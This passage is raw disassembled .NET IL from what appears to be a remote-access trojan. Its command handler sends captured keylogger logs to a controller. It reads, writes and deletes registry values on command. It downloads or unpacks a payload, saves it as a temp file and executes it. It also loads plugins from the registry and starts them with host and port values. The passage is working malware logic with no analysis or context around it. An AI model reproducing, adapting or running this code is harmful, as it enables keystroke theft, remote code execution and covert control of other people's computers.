        IL_1684:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1689:  stloc.s    V_63
        IL_168b:  nop
        IL_168c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1691:  leave.s    IL_1693

      }  // end handler
      IL_1693:  nop
      IL_1694:  ldloc.s    V_128
      IL_1696:  ldc.i4.1
      IL_1697:  add.ovf
      IL_1698:  stloc.s    V_128
      IL_169a:  nop
      IL_169b:  ldloc.s    V_128
      IL_169d:  ldloc.s    V_129
      IL_169f:  ldlen
      IL_16a0:  conv.ovf.i4
      IL_16a1:  clt
      IL_16a3:  stloc.s    V_138
      IL_16a5:  ldloc.s    V_138
      IL_16a7:  brtrue.s   IL_164b

      IL_16a9:  br         IL_17d9

      IL_16ae:  nop
      IL_16af:  ldloc.s    V_107
      IL_16b1:  ldstr      "kl"
      IL_16b6:  ldc.i4.0
      IL_16b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16bc:  ldc.i4.0
      IL_16bd:  ceq
      IL_16bf:  stloc.s    V_138
      IL_16c1:  ldloc.s    V_138
      IL_16c3:  brfalse.s  IL_16f5

      IL_16c5:  nop
      IL_16c6:  ldstr      "kl"
      IL_16cb:  ldsfld     string j.OK::Y
      IL_16d0:  ldsfld     class j.kl j.OK::kq
      IL_16d5:  ldflda     string j.kl::Logs
      IL_16da:  call       string j.OK::ENB(string&)
      IL_16df:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_16e4:  call       bool j.OK::Send(string)
      IL_16e9:  pop
      IL_16ea:  nop
      IL_16eb:  leave      IL_25af

      IL_16f0:  br         IL_17d9

      IL_16f5:  nop
      IL_16f6:  ldloc.s    V_107
      IL_16f8:  ldstr      "prof"
      IL_16fd:  ldc.i4.0
      IL_16fe:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1703:  ldc.i4.0
      IL_1704:  ceq
      IL_1706:  stloc.s    V_138
      IL_1708:  ldloc.s    V_138
      IL_170a:  brfalse    IL_17d9

      IL_170f:  nop
      IL_1710:  nop
      IL_1711:  ldloc.0
      IL_1712:  ldc.i4.1
      IL_1713:  ldelem.ref
      IL_1714:  stloc.s    V_130
      IL_1716:  nop
      IL_1717:  ldloc.s    V_130
      IL_1719:  ldstr      "~"
      IL_171e:  ldc.i4.0
      IL_171f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1724:  ldc.i4.0
      IL_1725:  ceq
      IL_1727:  stloc.s    V_137
      IL_1729:  ldloc.s    V_137
      IL_172b:  brfalse.s  IL_1746

      IL_172d:  nop
      IL_172e:  ldloc.0
      IL_172f:  ldc.i4.2
      IL_1730:  ldelem.ref
      IL_1731:  ldloc.0
      IL_1732:  ldc.i4.3
      IL_1733:  ldelem.ref
      IL_1734:  ldc.i4.1
      IL_1735:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_173a:  pop
      IL_173b:  nop
      IL_173c:  br         IL_17d2

      IL_1741:  br         IL_17d2

      IL_1746:  nop
      IL_1747:  ldloc.s    V_130
      IL_1749:  ldstr      "!"
      IL_174e:  ldc.i4.0
      IL_174f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1754:  ldc.i4.0
      IL_1755:  ceq
      IL_1757:  stloc.s    V_138
      IL_1759:  ldloc.s    V_138
      IL_175b:  brfalse.s  IL_17ae

      IL_175d:  nop
      IL_175e:  ldloc.0
      IL_175f:  ldc.i4.2
      IL_1760:  ldelem.ref
      IL_1761:  ldloc.0
      IL_1762:  ldc.i4.3
      IL_1763:  ldelem.ref
      IL_1764:  ldc.i4.1
      IL_1765:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_176a:  pop
      IL_176b:  ldstr      "getvalue"
      IL_1770:  ldsfld     string j.OK::Y
      IL_1775:  ldloc.0
      IL_1776:  ldc.i4.1
      IL_1777:  ldelem.ref
      IL_1778:  ldsfld     string j.OK::Y
      IL_177d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1782:  ldloc.0
      IL_1783:  ldc.i4.1
      IL_1784:  ldelem.ref
      IL_1785:  ldstr      ""
      IL_178a:  call       object j.OK::GTV(string,
                                            object)
      IL_178f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1794:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_1799:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_179e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_17a3:  call       bool j.OK::Send(string)
      IL_17a8:  pop
      IL_17a9:  nop
      IL_17aa:  br.s       IL_17d2

      IL_17ac:  br.s       IL_17d2

      IL_17ae:  nop
      IL_17af:  ldloc.s    V_130
      IL_17b1:  ldstr      "@"
      IL_17b6:  ldc.i4.0
      IL_17b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_17bc:  ldc.i4.0
      IL_17bd:  ceq
      IL_17bf:  stloc.s    V_138
      IL_17c1:  ldloc.s    V_138
      IL_17c3:  brfalse.s  IL_17d2

      IL_17c5:  nop
      IL_17c6:  ldloc.0
      IL_17c7:  ldc.i4.2
      IL_17c8:  ldelem.ref
      IL_17c9:  call       void j.OK::DLV(string)
      IL_17ce:  nop
      IL_17cf:  nop
      IL_17d0:  br.s       IL_17d2

      IL_17d2:  nop
      IL_17d3:  nop
      IL_17d4:  leave      IL_25af

      IL_17d9:  nop
      IL_17da:  ldloc.s    V_9
      IL_17dc:  ldstr      "rn"
      IL_17e1:  ldc.i4.0
      IL_17e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_17e7:  ldc.i4.0
      IL_17e8:  ceq
      IL_17ea:  ldc.i4.0
      IL_17eb:  ceq
      IL_17ed:  stloc.s    V_138
      IL_17ef:  ldloc.s    V_138
      IL_17f1:  brfalse.s  IL_17f8

      IL_17f3:  br         IL_19c4

      IL_17f8:  nop
      IL_17f9:  ldloc.0
      IL_17fa:  ldc.i4.2
      IL_17fb:  ldelem.ref
      IL_17fc:  ldc.i4.0
      IL_17fd:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_1802:  ldc.i4.s   31
      IL_1804:  ceq
      IL_1806:  stloc.s    V_138
      IL_1808:  ldloc.s    V_138
      IL_180a:  brfalse    IL_18ac

      IL_180f:  nop
      .try
      {
        IL_1810:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1815:  stloc.s    V_65
        IL_1817:  ldloc.0
        IL_1818:  ldc.i4.0
        IL_1819:  ldelem.ref
        IL_181a:  ldsfld     string j.OK::Y
        IL_181f:  ldloc.0
        IL_1820:  ldc.i4.1
        IL_1821:  ldelem.ref
        IL_1822:  ldsfld     string j.OK::Y
        IL_1827:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_182c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_1831:  stloc.s    V_64
        IL_1833:  ldloc.s    V_65
        IL_1835:  ldarg.0
        IL_1836:  ldloc.s    V_64
        IL_1838:  ldarg.0
        IL_1839:  ldlen
        IL_183a:  conv.ovf.i4
        IL_183b:  ldloc.s    V_64
        IL_183d:  sub.ovf
        IL_183e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_1843:  nop
        IL_1844:  ldloc.s    V_65
        IL_1846:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_184b:  call       uint8[] j.OK::ZIP(uint8[])
        IL_1850:  stloc.1
        IL_1851:  nop
        IL_1852:  leave      IL_1914

        IL_1857:  leave.s    IL_18ab

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1859:  dup
        IL_185a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_185f:  stloc.s    V_67
        IL_1861:  nop
        IL_1862:  ldloc.s    V_67
        IL_1864:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1869:  nop
        IL_186a:  ldloc.s    V_67
        IL_186c:  stloc.s    V_66
        IL_186e:  ldstr      "MSG"
        IL_1873:  ldsfld     string j.OK::Y
        IL_1878:  ldstr      "Execute ERROR"
        IL_187d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1882:  call       bool j.OK::Send(string)
        IL_1887:  pop
        IL_1888:  ldstr      "bla"
        IL_188d:  call       bool j.OK::Send(string)
        IL_1892:  pop
        IL_1893:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1898:  nop
        IL_1899:  nop
        IL_189a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_189f:  leave      IL_25af

        IL_18a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_18a9:  leave.s    IL_18ab

      }  // end handler
      IL_18ab:  nop
      IL_18ac:  nop
      IL_18ad:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_18b2:  stloc.3
      IL_18b3:  nop
      .try
      {
        IL_18b4:  ldloc.3
        IL_18b5:  ldloc.0
        IL_18b6:  ldc.i4.2
        IL_18b7:  ldelem.ref
        IL_18b8:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_18bd:  stloc.1
        IL_18be:  leave.s    IL_1912

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_18c0:  dup
        IL_18c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_18c6:  stloc.s    V_68
        IL_18c8:  nop
        IL_18c9:  ldloc.s    V_68
        IL_18cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_18d0:  nop
        IL_18d1:  ldloc.s    V_68
        IL_18d3:  stloc.s    V_69
        IL_18d5:  ldstr      "MSG"
        IL_18da:  ldsfld     string j.OK::Y
        IL_18df:  ldstr      "Download ERROR"
        IL_18e4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_18e9:  call       bool j.OK::Send(string)
        IL_18ee:  pop
        IL_18ef:  ldstr      "bla"
        IL_18f4:  call       bool j.OK::Send(string)
        IL_18f9:  pop
        IL_18fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_18ff:  nop
        IL_1900:  nop
        IL_1901:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1906:  leave      IL_25af

        IL_190b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1910:  leave.s    IL_1912

      }  // end handler
      IL_1912:  nop
      IL_1913:  nop
      IL_1914:  nop
      IL_1915:  ldstr      "bla"
      IL_191a:  call       bool j.OK::Send(string)
      IL_191f:  pop
      IL_1920:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_1925:  ldstr      "."
      IL_192a:  ldloc.0
      IL_192b:  ldc.i4.1
      IL_192c:  ldelem.ref
      IL_192d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1932:  stloc.s    V_6
      IL_1934:  nop
      .try
      {
        IL_1935:  ldloc.s    V_6
        IL_1937:  ldloc.1
        IL_1938:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_193d:  nop
        IL_193e:  ldloc.s    V_6
        IL_1940:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_1945:  pop
        IL_1946:  ldstr      "MSG"
        IL_194b:  ldsfld     string j.OK::Y
        IL_1950:  ldstr      "Executed As "
        IL_1955:  ldloc.s    V_6
        IL_1957:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_195c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1961:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1966:  call       bool j.OK::Send(string)
        IL_196b:  pop
        IL_196c:  nop
        IL_196d:  leave      IL_25af

        IL_1972:  leave.s    IL_19c2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1974:  dup
        IL_1975:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_197a:  stloc.s    V_70
        IL_197c:  nop
        IL_197d:  ldloc.s    V_70
        IL_197f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1984:  nop
        IL_1985:  ldloc.s    V_70
        IL_1987:  stloc.s    V_71
        IL_1989:  ldstr      "MSG"
        IL_198e:  ldsfld     string j.OK::Y
        IL_1993:  ldstr      "Execute ERROR "
        IL_1998:  ldloc.s    V_71
        IL_199a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_199f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_19a4:  call       bool j.OK::Send(string)
        IL_19a9:  pop
        IL_19aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_19af:  nop
        IL_19b0:  nop
        IL_19b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_19b6:  leave      IL_25af

        IL_19bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_19c0:  leave.s    IL_19c2

      }  // end handler
      IL_19c2:  nop
      IL_19c3:  nop
      IL_19c4:  nop
      IL_19c5:  nop
      IL_19c6:  ldloc.s    V_9
      IL_19c8:  stloc.s    V_131
      IL_19ca:  nop
      IL_19cb:  ldloc.s    V_131
      IL_19cd:  ldstr      "inv"
      IL_19d2:  ldc.i4.0
      IL_19d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_19d8:  ldc.i4.0
      IL_19d9:  ceq
      IL_19db:  stloc.s    V_138
      IL_19dd:  ldloc.s    V_138
      IL_19df:  brfalse    IL_1c80

      IL_19e4:  nop
      IL_19e5:  ldloc.0
      IL_19e6:  ldc.i4.1
      IL_19e7:  ldelem.ref
      IL_19e8:  ldc.i4.0
      IL_19e9:  newarr     [mscorlib]System.Byte
      IL_19ee:  call       object j.OK::GTV(string,
                                            object)
      IL_19f3:  castclass  uint8[]
      IL_19f8:  stloc.s    V_72
      IL_19fa:  ldloc.0
      IL_19fb:  ldc.i4.3
      IL_19fc:  ldelem.ref
      IL_19fd:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1a02:  ldc.i4.s   10
      IL_1a04:  clt
      IL_1a06:  ldloc.s    V_72
      IL_1a08:  ldlen
      IL_1a09:  conv.ovf.i4
      IL_1a0a:  ldc.i4.0
      IL_1a0b:  ceq
      IL_1a0d:  and
      IL_1a0e:  stloc.s    V_138
      IL_1a10:  ldloc.s    V_138
      IL_1a12:  brfalse.s  IL_1a5f

      IL_1a14:  ldc.i4.5
      IL_1a15:  newarr     [mscorlib]System.String
      IL_1a1a:  stloc.s    V_108
      IL_1a1c:  ldloc.s    V_108
      IL_1a1e:  ldc.i4.0
      IL_1a1f:  ldstr      "pl"
      IL_1a24:  stelem.ref
      IL_1a25:  nop
      IL_1a26:  ldloc.s    V_108
      IL_1a28:  ldc.i4.1
      IL_1a29:  ldsfld     string j.OK::Y
      IL_1a2e:  stelem.ref
      IL_1a2f:  nop
      IL_1a30:  ldloc.s    V_108
      IL_1a32:  ldc.i4.2
      IL_1a33:  ldloc.0
      IL_1a34:  ldc.i4.1
      IL_1a35:  ldelem.ref
      IL_1a36:  stelem.ref
      IL_1a37:  nop
      IL_1a38:  ldloc.s    V_108
      IL_1a3a:  ldc.i4.3
      IL_1a3b:  ldsfld     string j.OK::Y
      IL_1a40:  stelem.ref
      IL_1a41:  nop
      IL_1a42:  ldloc.s    V_108
      IL_1a44:  ldc.i4.4
      IL_1a45:  ldc.i4.1
      IL_1a46:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1a4b:  stelem.ref
      IL_1a4c:  nop
      IL_1a4d:  ldloc.s    V_108
      IL_1a4f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1a54:  call       bool j.OK::Send(string)
      IL_1a59:  pop
      IL_1a5a:  br         IL_1c74

      IL_1a5f:  nop
      IL_1a60:  ldloc.0
      IL_1a61:  ldc.i4.3
      IL_1a62:  ldelem.ref
      IL_1a63:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1a68:  ldc.i4.s   10
      IL_1a6a:  cgt
      IL_1a6c:  stloc.s    V_138
      IL_1a6e:  ldloc.s    V_138
      IL_1a70:  brfalse.s  IL_1af0

      IL_1a72:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1a77:  stloc.s    V_75
      IL_1a79:  ldc.i4.6
      IL_1a7a:  newarr     [mscorlib]System.String
      IL_1a7f:  stloc.s    V_108
      IL_1a81:  ldloc.s    V_108
      IL_1a83:  ldc.i4.0
      IL_1a84:  ldloc.0
      IL_1a85:  ldc.i4.0
      IL_1a86:  ldelem.ref
      IL_1a87:  stelem.ref
      IL_1a88:  nop
      IL_1a89:  ldloc.s    V_108
      IL_1a8b:  ldc.i4.1
      IL_1a8c:  ldsfld     string j.OK::Y
      IL_1a91:  stelem.ref
      IL_1a92:  nop
      IL_1a93:  ldloc.s    V_108
      IL_1a95:  ldc.i4.2
      IL_1a96:  ldloc.0
      IL_1a97:  ldc.i4.1
      IL_1a98:  ldelem.ref
      IL_1a99:  stelem.ref
      IL_1a9a:  nop
      IL_1a9b:  ldloc.s    V_108
      IL_1a9d:  ldc.i4.3
      IL_1a9e:  ldsfld     string j.OK::Y
      IL_1aa3:  stelem.ref
      IL_1aa4:  nop
      IL_1aa5:  ldloc.s    V_108
      IL_1aa7:  ldc.i4.4
      IL_1aa8:  ldloc.0
      IL_1aa9:  ldc.i4.2
      IL_1aaa:  ldelem.ref
      IL_1aab:  stelem.ref
      IL_1aac:  nop
      IL_1aad:  ldloc.s    V_108
      IL_1aaf:  ldc.i4.5
      IL_1ab0:  ldsfld     string j.OK::Y
      IL_1ab5:  stelem.ref
      IL_1ab6:  nop
      IL_1ab7:  ldloc.s    V_108
      IL_1ab9:  call       string [mscorlib]System.String::Concat(string[])
      IL_1abe:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1ac3:  stloc.s    V_74
      IL_1ac5:  ldloc.s    V_75
      IL_1ac7:  ldarg.0
      IL_1ac8:  ldloc.s    V_74
      IL_1aca:  ldarg.0
      IL_1acb:  ldlen
      IL_1acc:  conv.ovf.i4
      IL_1acd:  ldloc.s    V_74
      IL_1acf:  sub.ovf
      IL_1ad0:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1ad5:  nop
      IL_1ad6:  ldloc.s    V_75
      IL_1ad8:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1add:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1ae2:  stloc.s    V_72
      IL_1ae4:  ldloc.0
      IL_1ae5:  ldc.i4.1
      IL_1ae6:  ldelem.ref
      IL_1ae7:  ldloc.s    V_72
      IL_1ae9:  ldc.i4.3
      IL_1aea:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1aef:  pop
      IL_1af0:  nop
      IL_1af1:  ldc.i4.5
      IL_1af2:  newarr     [mscorlib]System.String
      IL_1af7:  stloc.s    V_108
      IL_1af9:  ldloc.s    V_108
      IL_1afb:  ldc.i4.0
      IL_1afc:  ldstr      "pl"
      IL_1b01:  stelem.ref
      IL_1b02:  nop
      IL_1b03:  ldloc.s    V_108
      IL_1b05:  ldc.i4.1
      IL_1b06:  ldsfld     string j.OK::Y
      IL_1b0b:  stelem.ref
      IL_1b0c:  nop
      IL_1b0d:  ldloc.s    V_108
      IL_1b0f:  ldc.i4.2
      IL_1b10:  ldloc.0
      IL_1b11:  ldc.i4.1
      IL_1b12:  ldelem.ref
      IL_1b13:  stelem.ref
      IL_1b14:  nop
      IL_1b15:  ldloc.s    V_108
      IL_1b17:  ldc.i4.3
      IL_1b18:  ldsfld     string j.OK::Y
      IL_1b1d:  stelem.ref
      IL_1b1e:  nop
      IL_1b1f:  ldloc.s    V_108
      IL_1b21:  ldc.i4.4
      IL_1b22:  ldc.i4.0
      IL_1b23:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1b28:  stelem.ref
      IL_1b29:  nop
      IL_1b2a:  ldloc.s    V_108
      IL_1b2c:  call       string [mscorlib]System.String::Concat(string[])
      IL_1b31:  call       bool j.OK::Send(string)
      IL_1b36:  pop
      IL_1b37:  ldloc.s    V_72
      IL_1b39:  ldstr      "A"
      IL_1b3e:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1b43:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b48:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b4d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b52:  stloc.s    V_73
      IL_1b54:  ldloc.s    V_73
      IL_1b56:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b5b:  ldnull
      IL_1b5c:  ldstr      "h"
      IL_1b61:  ldc.i4.1
      IL_1b62:  newarr     [mscorlib]System.Object
      IL_1b67:  stloc.s    V_111
      IL_1b69:  ldloc.s    V_111
      IL_1b6b:  ldc.i4.0
      IL_1b6c:  ldsfld     string j.OK::H
      IL_1b71:  stelem.ref
      IL_1b72:  nop
      IL_1b73:  ldloc.s    V_111
      IL_1b75:  ldnull
      IL_1b76:  ldnull
      IL_1b77:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1b7c:  nop
      IL_1b7d:  ldloc.s    V_73
      IL_1b7f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1b84:  ldnull
      IL_1b85:  ldstr      "p"
      IL_1b8a:  ldc.i4.1
      IL_1b8b:  newarr     [mscorlib]System.Object
      IL_1b90:  stloc.s    V_111
      IL_1b92:  ldloc.s    V_111
      IL_1b94:  ldc.i4.0
      IL_1b95:  ldsfld     string j.OK::P
      IL_1b9a:  stelem.ref
      IL_1b9b:  nop
      IL_1b9c:  ldloc.s    V_111
      IL_1b9e:  ldnull
      IL_1b9f:  ldnull
      IL_1ba0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1ba5:  nop
      IL_1ba6:  ldloc.s    V_73
      IL_1ba8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1bad:  ldnull
      IL_1bae:  ldstr      "osk"
      IL_1bb3:  ldc.i4.1
      IL_1bb4:  newarr     [mscorlib]System.Object
      IL_1bb9:  stloc.s    V_111
      IL_1bbb:  ldloc.s    V_111
      IL_1bbd:  ldc.i4.0
      IL_1bbe:  ldloc.0
      IL_1bbf:  ldc.i4.2
      IL_1bc0:  ldelem.ref
      IL_1bc1:  stelem.ref
      IL_1bc2:  nop
      IL_1bc3:  ldloc.s    V_111
      IL_1bc5:  ldnull
      IL_1bc6:  ldnull
      IL_1bc7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1bcc:  nop
      IL_1bcd:  ldloc.s    V_73
      IL_1bcf:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1bd4:  ldnull
      IL_1bd5:  ldstr      "start"
      IL_1bda:  ldc.i4.0
      IL_1bdb:  newarr     [mscorlib]System.Object
      IL_1be0:  ldnull
      IL_1be1:  ldnull
      IL_1be2:  ldnull
      IL_1be3:  ldc.i4.1
      IL_1be4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1be9:  pop
      IL_1bea:  br.s       IL_1bf4

      IL_1bec:  ldc.i4.1
      IL_1bed:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_1bf2:  nop
      IL_1bf3:  nop
      IL_1bf4:  ldsfld     bool j.OK::Cn
      IL_1bf9:  ldc.i4.0
      IL_1bfa:  ceq
      IL_1bfc:  box        [mscorlib]System.Boolean
      IL_1c01:  ldloc.s    V_73
      IL_1c03:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1c08:  ldnull
      IL_1c09:  ldstr      "Off"
      IL_1c0e:  ldc.i4.0
      IL_1c0f:  newarr     [mscorlib]System.Object
      IL_1c14:  ldnull
      IL_1c15:  ldnull
      IL_1c16:  ldnull
      IL_1c17:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1c1c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1c21:  ldc.i4.1
      IL_1c22:  box        [mscorlib]System.Boolean
      IL_1c27:  ldc.i4.0
      IL_1c28:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_1c2d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1c32:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_1c37:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1c3c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1c41:  ldc.i4.0
      IL_1c42:  ceq
      IL_1c44:  stloc.s    V_138
      IL_1c46:  ldloc.s    V_138
      IL_1c48:  brtrue.s   IL_1bec

      IL_1c4a:  ldloc.s    V_73
      IL_1c4c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1c51:  ldnull
      IL_1c52:  ldstr      "off"
      IL_1c57:  ldc.i4.1
      IL_1c58:  newarr     [mscorlib]System.Object
      IL_1c5d:  stloc.s    V_111
      IL_1c5f:  ldloc.s    V_111
      IL_1c61:  ldc.i4.0
      IL_1c62:  ldc.i4.1
      IL_1c63:  box        [mscorlib]System.Boolean
      IL_1c68:  stelem.ref
      IL_1c69:  nop
      IL_1c6a:  ldloc.s    V_111
      IL_1c6c:  ldnull
      IL_1c6d:  ldnull
      IL_1c6e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1c73:  nop
      IL_1c74:  nop
      IL_1c75:  nop
      IL_1c76:  leave      IL_25af

